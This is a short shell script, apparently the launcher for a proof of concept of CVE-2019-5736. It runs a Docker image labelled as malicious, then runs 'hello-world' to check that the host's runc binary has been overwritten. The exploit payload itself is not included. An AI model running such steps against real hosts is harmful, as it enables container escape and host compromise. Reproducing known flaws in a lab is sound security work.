echo "Running Malicious Container"

#run the malicios image
docker run cve-2019-5736:malicious_image_POC

#verify runc Rewrite. 
docker run hello-world

echo "POC Completed"
